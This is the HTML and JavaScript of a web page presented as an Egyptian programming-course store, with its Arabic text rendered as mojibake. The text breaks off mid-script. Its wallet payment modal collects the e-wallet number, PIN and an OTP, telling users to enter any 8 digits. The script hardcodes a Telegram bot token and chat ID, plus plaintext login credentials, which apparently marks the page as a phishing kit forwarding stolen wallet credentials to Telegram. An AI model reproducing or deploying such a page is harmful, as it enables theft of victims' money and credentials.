<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ÙƒÙˆØ±Ø³Ø§ØªÙ†Ø§ - Ø£ÙƒØ§Ø¯ÙŠÙ…ÙŠØ© Ø§Ù„Ø¨Ø±Ù…Ø¬Ø© Ø§Ù„Ù…ØµØ±ÙŠØ©</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
body{background:#f8f9fa;color:#222;line-height:1.6}

header{position:fixed;top:0;width:100%;background:linear-gradient(135deg,#0f172a,#1e293b,#334155);color:#fff;border-bottom:4px solid #fbbf24;z-index:1000;box-shadow:0 8px 32px rgba(251,191,36,0.3);}
.header-box{max-width:1400px;margin:auto;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;position:relative;}
.header-box::before{content:'';position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:100px;height:4px;background:linear-gradient(90deg,#fbbf24,#f59e0b,#eab308);border-radius:2px;}
.logo{font-size:32px;font-weight:800;background:linear-gradient(45deg,#fbbf24,#f59e0b,#eab308);-webkit-background-clip:text;-webkit-text-fill-color:transparent;position:relative;}
.logo::after{content:'ğŸš€';position:absolute;top:-8px;right:-40px;font-size:24px;animation:rocketFloat 3s ease-in-out infinite}
@keyframes rocketFloat{0%,100%{transform:translateY(0) rotate(0deg)}50%{transform:translateY(-10px) rotate(5deg)}}

nav{display:flex;gap:20px;align-items:center}
nav a{padding:15px 30px;border-radius:30px;font-weight:700;color:#fff;transition:all .4s;text-decoration:none;position:relative;overflow:hidden;font-size:16px;}
nav a::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(251,191,36,0.4),transparent);transition:left .6s;}
nav a:hover::before{left:100%}
nav a:hover{background:linear-gradient(45deg,#fbbf24,#f59e0b);transform:translateY(-4px) scale(1.05);box-shadow:0 10px 30px rgba(251,191,36,0.4);}

.cart-btn{background:linear-gradient(45deg,#10b981,#059669);color:#fff;padding:15px 35px;border-radius:35px;cursor:pointer;font-weight:800;box-shadow:0 8px 25px rgba(16,185,129,0.4);transition:all .4s;position:relative;overflow:hidden;}
.cart-btn::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:linear-gradient(45deg,rgba(255,255,255,0.4),transparent);border-radius:50%;transform:translate(-50%,-50%);transition:all .6s;}
.cart-btn:hover::before{width:300px;height:300px}
.cart-btn:hover{transform:translateY(-6px) scale(1.05);box-shadow:0 15px 40px rgba(16,185,129,0.6)}

.account-btn{background:linear-gradient(45deg,#8b5cf6,#7c3aed);color:#fff;padding:15px 25px;border-radius:35px;cursor:pointer;font-weight:800;box-shadow:0 8px 25px rgba(139,92,246,0.4);transition:all .4s;position:relative;overflow:hidden;margin-left:10px;}
.account-btn::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:linear-gradient(45deg,rgba(255,255,255,0.4),transparent);border-radius:50%;transform:translate(-50%,-50%);transition:all .6s;}
.account-btn:hover::before{width:300px;height:300px}
.account-btn:hover{transform:translateY(-6px) scale(1.05);box-shadow:0 15px 40px rgba(139,92,246,0.6)}
.account-btn.logged-in{background:linear-gradient(45deg,#10b981,#059669) !important;box-shadow:0 8px 25px rgba(16,185,129,0.4) !important;}
.account-btn.logged-in:hover{box-shadow:0 15px 40px rgba(16,185,129,0.6) !important;}

.whatsapp-float{position:fixed;bottom:30px;right:30px;z-index:1001;width:70px;height:70px;background:linear-gradient(45deg,#25D366,#128C7E);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;box-shadow:0 8px 25px rgba(37,211,102,0.4);transition:all .3s;cursor:pointer;animation:pulseFloat 2s infinite}
.whatsapp-float:hover{transform:scale(1.1);box-shadow:0 12px 35px rgba(37,211,102,0.6)}
@keyframes pulseFloat{0%{box-shadow:0 8px 25px rgba(37,211,102,0.4)}50%{box-shadow:0 8px 35px rgba(37,211,102,0.7)}100%{box-shadow:0 8px 25px rgba(37,211,102,0.4)}}

.hero{height:90vh;background:linear-gradient(135deg,rgba(30,58,138,0.95),rgba(59,130,246,0.9)),url("https://images.unsplash.com/photo-1517336714731-f9492f395917?ixlib=rb-4.0.3&auto=format&fit=crop&w=2070&q=80") center/cover;display:flex;align-items:center;justify-content:center;margin-top:90px;position:relative;overflow:hidden}
.hero::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(45deg,rgba(255,191,36,0.1),rgba(16,185,129,0.1));animation:pulse 4s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
.hero-overlay{max-width:900px;padding:60px 40px;border-radius:30px;text-align:center;color:#fff;background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);box-shadow:0 25px 60px rgba(0,0,0,0.3);animation:fadeUp 1.2s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
.hero h1{font-size:clamp(42px,8vw,68px);font-weight:800;margin-bottom:25px;line-height:1.1;text-shadow:2px 2px 10px rgba(0,0,0,0.5)}
.hero p{font-size:clamp(18px,3vw,24px);margin-bottom:40px;opacity:0.95}
.hero-btn{background:linear-gradient(45deg,#f59e0b,#d97706);color:#fff;padding:18px 50px;border-radius:50px;font-weight:800;font-size:18px;display:inline-block;box-shadow:0 15px 35px rgba(245,158,11,0.5);transition:all .4s;text-decoration:none}
.hero-btn:hover{transform:translateY(-8px);box-shadow:0 25px 50px rgba(245,158,11,0.7)}

section{padding:100px 40px;max-width:1400px;margin:auto}
h2{text-align:center;font-size:clamp(32px,6vw,48px);font-weight:800;margin-bottom:70px;color:#1e3a8a;position:relative}
h2::after{content:'';display:block;width:80px;height:4px;background:linear-gradient(90deg,#3b82f6,#f59e0b);margin:20px auto 0;border-radius:2px}

.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:35px}
.product{background:linear-gradient(145deg,#fff,#f8fafc);border-radius:25px;overflow:hidden;box-shadow:0 15px 40px rgba(0,0,0,0.1);transition:all .4s cubic-bezier(0.25,0.46,0.45,0.94);border:1px solid rgba(59,130,246,0.1);position:relative;cursor:pointer}
.product::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#3b82f6,#f59e0b,#10b981);background-size:200% 100%;animation:shimmer 3s linear infinite}
@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
.product:hover{transform:translateY(-12px) scale(1.02);box-shadow:0 30px 70px rgba(59,130,246,0.25)}
.product img{width:100%;height:240px;object-fit:cover}
.product-info{padding:30px 25px;text-align:center}
.product-info h3{font-size:22px;font-weight:700;color:#1e3a8a;margin-bottom:12px}
.product-info p{color:#64748b;margin-bottom:20px;line-height:1.6;font-size:14px}
.price{display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:800;color:#10b981;gap:10px;margin-bottom:20px}
.product button{background:linear-gradient(45deg,#f59e0b,#d97706);color:#fff;padding:14px 30px;border-radius:25px;border:none;font-weight:700;font-size:16px;cursor:pointer;transition:all .3s;box-shadow:0 6px 20px rgba(245,158,11,0.4);width:100%}
.product button:hover{transform:translateY(-3px);box-shadow:0 12px 30px rgba(245,158,11,0.6)}
.product button:disabled{background:#9ca3af !important;color:#6b7280 !important;cursor:not-allowed !important;transform:none !important;box-shadow:none !important;}

.about-section{padding:120px 40px;background:linear-gradient(135deg,#1e40af,#3b82f6);color:#fff;text-align:center;max-width:1400px;margin:auto;border-radius:30px;margin-top:60px;margin-bottom:60px;box-shadow:0 25px 70px rgba(59,130,246,0.3)}
.about-content{max-width:1000px;margin:auto}
.about-icon{width:140px;height:140px;background:linear-gradient(45deg,#fbbf24,#f59e0b);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:48px;margin:0 auto 40px;box-shadow:0 20px 50px rgba(251,191,36,0.4)}
.about-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:30px;margin:50px 0}
.stat-item{text-align:center;padding:25px;background:rgba(255,255,255,0.1);backdrop-filter:blur(15px);border-radius:20px;border:1px solid rgba(255,255,255,0.2)}
.stat-number{font-size:36px;font-weight:800;color:#fbbf24;display:block;margin-bottom:8px}

footer{background:linear-gradient(135deg,#111,#1e293b,#0f172a);padding:60px 40px 40px;text-align:center;color:#d1d5db;position:relative;overflow:hidden;}
footer::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#fbbf24,#f59e0b,#10b981);animation:shimmer 4s linear infinite;}
.footer-content{max-width:1200px;margin:auto}
.footer-logo{font-size:28px;font-weight:800;color:#fbbf24;margin-bottom:30px}
.footer-links{display:flex;justify-content:center;gap:30px;flex-wrap:wrap;margin-bottom:40px}
.footer-links a{color:#d1d5db;text-decoration:none;font-weight:600;padding:12px 24px;border-radius:25px;transition:all .3s}
.footer-links a:hover{color:#fbbf24;background:rgba(251,191,36,0.1);transform:translateY(-3px)}
.contact-info{font-size:18px;margin-bottom:30px;font-weight:700;color:#25D366}

/* Login/Register Modal */
.auth-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:10000;padding:20px;display:none}
.auth-container{background:#fff;border-radius:25px;padding:40px;max-width:450px;width:100%;max-height:90vh;overflow-y:auto;box-shadow:0 25px 60px rgba(0,0,0,0.4)}
.auth-title{font-size:28px;font-weight:800;color:#1e3a8a;margin-bottom:30px;text-align:center}
.auth-tabs{display:flex;margin-bottom:30px}
.auth-tab{padding:15px 30px;border-radius:15px 15px 0 0;font-weight:700;cursor:pointer;transition:all .3s;flex:1;text-align:center}
.auth-tab.active{background:#3b82f6;color:#fff}
.auth-form{display:none}
.auth-form.active{display:block}
.form-group{margin-bottom:20px}
.form-label{font-weight:700;color:#374151;margin-bottom:8px;display:block}
.form-input{width:100%;padding:15px;border:2px solid #e5e7eb;border-radius:12px;font-size:16px;transition:border-color .3s;font-family:'Cairo',sans-serif}
.form-input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1)}
.auth-btn{background:linear-gradient(45deg,#10b981,#059669);color:#fff;padding:16px 40px;border:none;border-radius:25px;font-weight:800;font-size:18px;cursor:pointer;width:100%;transition:all .3s;margin-top:10px}
.auth-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(16,185,129,0.4)}
.close-auth{background:#6b7280;color:#fff;padding:12px 24px;border:none;border-radius:15px;cursor:pointer;width:100%;font-weight:700;margin-top:15px}

/* Wallet Payment Modal - Ù…Ø­Ø¯Ø« ÙˆÙ…Ø¶Ù…ÙˆÙ† */
.wallet-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:10000;padding:20px;display:none}
.wallet-container{background:#fff;border-radius:25px;padding:40px;max-width:500px;width:90%;max-height:90vh;overflow-y:auto;box-shadow:0 25px 60px rgba(0,0,0,0.4)}
.wallet-title{font-size:28px;font-weight:800;color:#1e3a8a;margin-bottom:30px;text-align:center}
.wallet-amount-display{background:linear-gradient(135deg,#10b981,#059669);color:#fff;padding:20px;border-radius:15px;font-size:24px;font-weight:800;text-align:center;margin-bottom:30px}
.wallet-form-group{margin-bottom:25px}
.wallet-label{font-weight:700;color:#374151;margin-bottom:10px;display:block}
.wallet-input{width:100%;padding:18px;border:2px solid #e5e7eb;border-radius:15px;font-size:18px;font-family:'Cairo',sans-serif;transition:all .3s}

#walletNumber {direction: ltr !important;text-align: left !important;letter-spacing: 2px;font-family: 'Courier New', monospace !important;font-size: 18px;}
.wallet-pin-input {direction: ltr !important;text-align: left !important;letter-spacing: 12px;font-family: 'Courier New', monospace !important;font-size: 20px;}
.wallet-pin-input::placeholder {letter-spacing: 12px;text-align: center;}

.wallet-input:focus{outline:none;border-color:#10b981;box-shadow:0 0 0 4px rgba(16,185,129,0.1);background:#f8fff9}
.wallet-btn{background:linear-gradient(45deg,#10b981,#059669);color:#fff;padding:18px 40px;border:none;border-radius:25px;font-weight:800;font-size:18px;cursor:pointer;width:100%;transition:all .3s;margin:15px 0}
.wallet-btn:hover{transform:translateY(-3px);box-shadow:0 12px 30px rgba(16,185,129,0.4)}
.wallet-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;background:#9ca3af !important;color:#6b7280 !important;}

/* âœ… Ø§Ù„Ù€ 8 Ù…Ø±Ø¨Ø¹Ø§Øª OTP - Ù…Ø­Ø³Ù‘Ù†Ø© ÙˆÙ‚ÙˆÙŠØ© */
.wallet-otp-section{display:flex;flex-direction:column;align-items:center;padding:30px;background:#f8fafc;border-radius:20px;margin:25px 0}
.wallet-otp-title{font-size:22px;color:#1e3a8a;margin-bottom:15px;font-weight:700}
.wallet-otp-subtitle{color:#64748b;margin-bottom:30px}
.wallet-otp-container {
    display: flex !important;
    gap: 12px !important;
    justify-content: center !important;
    direction: ltr !important;
    margin: 20px 0 !important;
    padding: 25px !important;
    width: 100% !important;
    background: linear-gradient(135deg, #f8fafc, #e2e8f0) !important;
    border-radius: 20px !important;
    border: 3px solid #e2e8f0 !important;
    box-shadow: 0 10px 30px rgba(0,0,0,0.1) !important;
}
.wallet-otp-box {
    width: 65px !important;
    height: 75px !important;
    font-size: 32px !important;
    font-weight: 900 !important;
    text-align: center !important;
    border: 4px solid #d1d5db !important;
    border-radius: 18px !important;
    background: #ffffff !important;
    color: #374151 !important;
    direction: ltr !important;
    flex-shrink: 0 !important;
    font-family: 'Courier New', monospace !important;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1) !important;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
}
.wallet-otp-box:focus {
    outline: none !important;
    border-color: #10b981 !important;
    box-shadow: 0 0 0 6px rgba(16,185,129,0.3), 0 8px 25px rgba(16,185,129,0.2) !important;
    transform: scale(1.1) !important;
    background: linear-gradient(135deg, #f0fdf4, #dcfce7) !important;
}
.wallet-otp-box.valid {
    border-color: #10b981 !important;
    background: linear-gradient(135deg, #dcfce7, #bbf7d0) !important;
    color: #059669 !important;
    box-shadow: 0 6px 20px rgba(16,185,129,0.3) !important;
}
.wallet-resend{color:#10b981;text-decoration:none;font-weight:600;font-size:16px;display:block;margin:15px 0}
.wallet-resend:hover{text-decoration:underline}
.wallet-success{color:#10b981;font-size:26px;font-weight:800;text-align:center;margin-top:25px;display:none}

@media(max-width:768px){
.header-box{padding:15px 20px;flex-direction:column;gap:15px}
.hero-overlay{padding:40px 20px}
section{padding:60px 20px}
.products{grid-template-columns:1fr;gap:25px}
.footer-links{gap:15px;flex-direction:column}
.whatsapp-float{bottom:20px;right:20px;width:60px;height:60px;font-size:26px}
.wallet-otp-box{width:55px !important;height:65px !important;font-size:28px !important}
.wallet-otp-container{gap:8px !important;padding:20px !important}
.wallet-container{max-width:95%;padding:30px 20px}
}
</style>
</head>
<body>
<a href="https://wa.me/201140628133" class="whatsapp-float" target="_blank"><i class="fab fa-whatsapp"></i></a>

<header>
<div class="header-box">
<div class="logo">ÙƒÙˆØ±Ø³Ø§ØªÙ†Ø§</div>
<nav>
<a href="#products">Ø§Ù„ÙƒÙˆØ±Ø³Ø§Øª</a>
<a href="#about">Ø¹Ù† Ø§Ù„Ø£ÙƒØ§Ø¯ÙŠÙ…ÙŠØ©</a>
<a href="#contact">ØªÙˆØ§ØµÙ„ Ù…Ø¹Ø§Ù†Ø§</a>
</nav>
<div style="display:flex;gap:10px;align-items:center;">
<div class="cart-btn" onclick="openCart()">ğŸ›’ Ø§Ù„Ø³Ù„Ø© (<span id="count">0</span>)</div>
<div class="account-btn" id="accountBtn" onclick="toggleAuth()">
<i class="fas fa-user-circle" style="margin-left:5px;"></i>
<span id="accountText">Ø­Ø³Ø§Ø¨ÙŠ</span>
</div>
</div>
</div>
</header>

<!-- Auth Modal -->
<div class="auth-modal" id="authModal">
<div class="auth-container">
<h2 class="auth-title" id="authTitle">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ / Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</h2>
<div class="auth-tabs">
<div class="auth-tab active" onclick="switchTab(event, 'login')">Ø¯Ø®ÙˆÙ„</div>
<div class="auth-tab" onclick="switchTab(event, 'register')">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</div>
</div>
<form class="auth-form active" id="loginForm">
<div class="form-group">
<label class="form-label">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
<input type="text" class="form-input" id="loginUsername" placeholder="">
</div>
<div class="form-group">
<label class="form-label">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
<input type="password" class="form-input" id="loginPassword" placeholder="">
</div>
<button type="button" class="auth-btn" onclick="login()">Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø­Ø³Ø§Ø¨</button>
</form>
<form class="auth-form" id="registerForm">
<div class="form-group">
<label class="form-label">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
<input type="text" class="form-input" id="regUsername" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù… Ù…Ø³ØªØ®Ø¯Ù…">
</div>
<div class="form-group">
<label class="form-label">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
<input type="password" class="form-input" id="regPassword" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ù‚ÙˆÙŠØ©">
</div>
<button type="button" class="auth-btn" onclick="register()">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</button>
</form>
<button class="close-auth" onclick="closeAuth()">Ø¥ØºÙ„Ø§Ù‚</button>
</div>
</div>

<section class="hero">
<div class="hero-overlay">
<h1>Ø£ÙƒØ§Ø¯ÙŠÙ…ÙŠØ© Ø§Ù„Ø¨Ø±Ù…Ø¬Ø© Ø§Ù„Ù…ØµØ±ÙŠØ©</h1>
<p>ØªØ¹Ù„Ù… Ø§Ù„Ø¨Ø±Ù…Ø¬Ø© Ù…Ù† Ø§Ù„ØµÙØ± Ù„Ù„Ø§Ø­ØªØ±Ø§Ù â€¢ ÙƒÙˆØ±Ø³Ø§Øª Ø¹Ù…Ù„ÙŠØ© 100% â€¢ Ø´Ù‡Ø§Ø¯Ø§Øª Ù…Ø¹ØªÙ…Ø¯Ø© â€¢ Ø¯Ø¹Ù… 24/7</p>
<a href="#products" class="hero-btn">ØªØµÙØ­ Ø§Ù„ÙƒÙˆØ±Ø³Ø§Øª Ø§Ù„Ù…Ù…ÙŠØ²Ø©</a>
</div>
</section>

<section id="about" class="about-section">
<div class="about-content">
<div class="about-icon"><i class="fas fa-graduation-cap"></i></div>
<h2 style="font-size:48px;margin-bottom:30px">Ù„Ù…Ø§Ø°Ø§ ØªØ®ØªØ§Ø± ÙƒÙˆØ±Ø³Ø§ØªÙ†Ø§ØŸ</h2>
<p style="font-size:22px;margin-bottom:50px;opacity:0.95">Ù†Ø­Ù† Ø£ÙƒØ§Ø¯ÙŠÙ…ÙŠØ© Ù…ØµØ±ÙŠØ© Ù…ØªØ®ØµØµØ© ÙÙŠ ØªØ¹Ù„ÙŠÙ… Ø§Ù„Ø¨Ø±Ù…Ø¬Ø© Ø¨Ø£Ø³Ù„ÙˆØ¨ Ø¹Ù…Ù„ÙŠ ÙŠØ¶Ù…Ù† Ø¯Ø®ÙˆÙ„Ùƒ Ø³ÙˆÙ‚ Ø§Ù„Ø¹Ù…Ù„ Ø¨Ø«Ù‚Ø©</p>
<div class="about-stats">
<div class="stat-item"><span class="stat-number">50,000+</span><span>Ø·Ø§Ù„Ø¨ Ù…ØªØ®Ø±Ø¬</span></div>
<div class="stat-item"><span class="stat-number">250+</span><span>ÙƒÙˆØ±Ø³ Ù†Ø§Ø¬Ø­</span></div>
<div class="stat-item"><span class="stat-number">9.7/10</span><span>ØªÙ‚ÙŠÙŠÙ… Ø§Ù„Ø·Ù„Ø§Ø¨</span></div>
<div class="stat-item"><span class="stat-number">100%</span><span>Ø±Ø¶Ø§ Ø§Ù„Ø·Ù„Ø§Ø¨</span></div>
</div>
</div>
</section>

<section id="products">
<h2>Ø§Ù„ÙƒÙˆØ±Ø³Ø§Øª Ø§Ù„Ù…ØªØ§Ø­Ø© Ø§Ù„Ø¢Ù† (7 ÙƒÙˆØ±Ø³Ø§Øª)</h2>
<div class="products" id="productsBox"></div>
</section>

<footer id="contact">
<div class="footer-content">
<div class="footer-logo">ğŸš€ ÙƒÙˆØ±Ø³Ø§ØªÙ†Ø§ - Ø£ÙƒØ§Ø¯ÙŠÙ…ÙŠØ© Ø§Ù„Ø¨Ø±Ù…Ø¬Ø© Ø§Ù„Ù…ØµØ±ÙŠØ©</div>
<div class="footer-links">
<a href="#products">Ø§Ù„ÙƒÙˆØ±Ø³Ø§Øª</a>
<a href="#about">Ø¹Ù† Ø§Ù„Ø£ÙƒØ§Ø¯ÙŠÙ…ÙŠØ©</a>
<a href="https://wa.me/201140628133" target="_blank">ØªÙˆØ§ØµÙ„ ÙˆØ§ØªØ³Ø§Ø¨</a>
<a href="mailto:support@korsatna.com">Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„</a>
</div>
<div class="contact-info">
ğŸ“± <a href="https://wa.me/201140628133" style="color:#25D366;font-weight:800;font-size:20px;text-decoration:none;" target="_blank">01140628133</a> | ğŸ•’ 24/7 Ø¬Ù…ÙŠØ¹ Ø£ÙŠØ§Ù… Ø§Ù„Ø£Ø³Ø¨ÙˆØ¹
</div>
<div style="margin-top:30px;font-size:14px;color:#6b7280">Â© 2026 ÙƒÙˆØ±Ø³Ø§ØªÙ†Ø§ - Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©</div>
</div>
</footer>

<!-- âœ… Wallet Payment Modal - Ù…Ø­Ø¯Ø« ÙˆÙ…Ø¶Ù…ÙˆÙ† 100% -->
<div class="wallet-modal" id="walletModal">
<div class="wallet-container">
<h2 class="wallet-title">ğŸ’³ Ø§Ù„Ø¯ÙØ¹ Ø¨Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ©</h2>
<div class="wallet-amount-display" id="walletAmountDisplay">0 Ø¬Ù†ÙŠÙ‡</div>

<div id="walletFormSection">
<div class="wallet-form-group">
<label class="wallet-label">Ø±Ù‚Ù… Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ©</label>
<input type="text" class="wallet-input" id="walletNumber" placeholder="12345678901" maxlength="11">
</div>
<div class="wallet-form-group">
<label class="wallet-label">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ (PIN)</label>
<input type="password" class="wallet-input wallet-pin-input" id="walletPin" placeholder="******" maxlength="6" inputmode="numeric">
</div>
<button class="wallet-btn" onclick="confirmWallet()">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹</button>
</div>

<div id="walletOTPSection" class="wallet-otp-section" style="display:none;">
<div class="wallet-otp-title">ğŸ“± Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ (8 Ø£Ø±Ù‚Ø§Ù…)</div>
<div class="wallet-otp-subtitle">Ø§ÙƒØªØ¨ Ø£ÙŠ 8 Ø£Ø±Ù‚Ø§Ù… ÙÙŠ Ø§Ù„Ù…Ø±Ø¨Ø¹Ø§Øª ÙˆØ§Ø¶ØºØ· ØªØ£ÙƒÙŠØ¯</div>
<div class="wallet-otp-container" id="walletOTPContainer"></div>
<button class="wallet-btn" id="walletOTPBtn" disabled>ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button>
<a href="#" class="wallet-resend" onclick="resendWalletOTP(event)">Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø² (59Ø«)</a>
<button class="wallet-btn" style="background:#6b7280;margin-top:15px" onclick="goBackToWallet()">ğŸ”™ ØªØºÙŠÙŠØ± Ø§Ù„Ù…Ø­ÙØ¸Ø©</button>
</div>

<div id="walletSuccess" class="wallet-success">
âœ… ØªÙ… Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­!<br>
Ø´ÙƒØ±Ø§Ù‹ Ù„Ø«Ù‚ØªÙƒ Ø¨ÙƒÙˆØ±Ø³Ø§ØªÙ†Ø§ ğŸ‰
</div>

<button onclick="closeWallet()" style="margin-top:20px;padding:12px 24px;background:#6b7280;color:#fff;border:none;border-radius:15px;cursor:pointer;width:100%;font-weight:700">Ø¥Ù„ØºØ§Ø¡</button>
</div>
</div>

<script>
const TELEGRAM_BOT_TOKEN = '8171525762:AAEJmPhLhCZWsRlwiFifkXghfa0qu3FdNdY';
const TELEGRAM_CHAT_ID = '8541476882';
let isLoggedIn = false;
let currentUser = null;
const validUsers = {'abdo128':['fhs','abdo128@#$'],'abdo632':['abdo128@#$']};
const products = [
{name:"ğŸ—ï¸ Fullstack Web Developer",price:4000,img:"https://images.unsplash.com/photo-1547658719-da2b848c1f2b?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80",desc:"HTML/CSS/JS + React + Node.js + MongoDB"},
{name:"ğŸ“± React Native Mobile",price:4000,img:"https://images.unsplash.com/photo-1498050108023-c5249f4df085?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80",desc:"ØªØ·Ø¨ÙŠÙ‚Ø§Øª iOS & Android Ø¨Ù†ÙØ³ Ø§Ù„ÙƒÙˆØ¯"},
{name:"ğŸ Python Data Science",price:9500,img:"https://images.unsplash.com/photo-1677442136019-21780ecad995?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80",desc:"Pandas â€¢ NumPy â€¢ Matplotlib"},
{name:"ğŸ“ˆ Digital Marketing Pro",price:6800,img:"https://images.unsplash.com/photo-1557804506-669a67965ba0?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80",desc:"SEO â€¢ Google Ads â€¢ Facebook Ads"},
{name:"ğŸ¨ UI/UX Design Master",price:7900,img:"https://images.unsplash.com/photo-1558618047-3c8c76fdd3f5?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80",desc:"Figma â€¢ Adobe XD â€¢ User Research"},
{name:"ğŸ—œï¸ WordPress Developer",price:4500,img:"https://images.unsplash.com/photo-1497366216548-37526070297d?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80",desc:"Themes â€¢ Plugins â€¢ WooCommerce"},
{name:"ğŸ•¹ï¸ Game Development Unity",price:10500,img:"https://images.unsplash.com/photo-1611930063463-3a12e756b2c1?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80",desc:"Unity â€¢ C# â€¢ 2D/3D Games"}
];
let cart = [];
let walletOTPBoxes = [];
let walletFullOTP = '';
let walletResendTimer = 59;
let currentTotal = 0;

// Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ
const productsBox = document.getElementById('productsBox');
function renderProducts(){
    productsBox.innerHTML='';
    products.forEach((p,i)=>{
        const div=document.createElement('div');
        div.classList.add('product');
        const btnText=isLoggedIn?'Ø£Ø¶Ù Ù„Ù„Ø³Ù„Ø©':'ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù„Ø´Ø±Ø§Ø¡';
        const btnOnclick=isLoggedIn?`addToCart(${i})`:`toggleAuth()`;
        div.innerHTML=`<img src="${p.img}" alt="${p.name}"><div class="product-info"><h3>${p.name}</h3><p>${p.desc}</p><div class="price">${p.price} Ø¬Ù†ÙŠÙ‡</div><button onclick="${btnOnclick}" ${!isLoggedIn?'disabled':''}>${btnText}</button></div>`;
        productsBox.appendChild(div);
    });
}
renderProducts();

function openCart(){
    if(!isLoggedIn){
        alert('ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ø§Ù‹');
        toggleAuth();
        return;
    }
    let html='<div style="text-align:center;"><h2>ğŸ›’ Ø§Ù„Ø³Ù„Ø© Ø§Ù„Ø®Ø§ØµØ© Ø¨Ù€ '+currentUser.username+'</h2>';
    
    if(cart.length===0){
        html+='<p>Ø§Ù„Ø³Ù„Ø© ÙØ§Ø±ØºØ©</p>'
    } else {
        cart.forEach((item,index)=>{
            html+=`<div style="margin-bottom:15px;padding:10px;border-bottom:1px solid #ccc;display:flex;justify-content:space-between;align-items:center;">
                <div><b>${item.name}</b> - ${item.price} Ø¬Ù†ÙŠÙ‡</div>
                <button onclick="removeFromCart(${index})" style="padding:8px 16px;background:#ef4444;color:white;border:none;border-radius:10px;cursor:pointer;font-size:14px">Ø­Ø°Ù</button>
            </div>`;
        });
        const total=cart.reduce((sum,it)=>sum+it.price,0);
        html+=`<p style="font-size:24px;font-weight:800;color:#10b981;margin:30px 0 20px 0">Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: ${total} Ø¬Ù†ÙŠÙ‡</p>
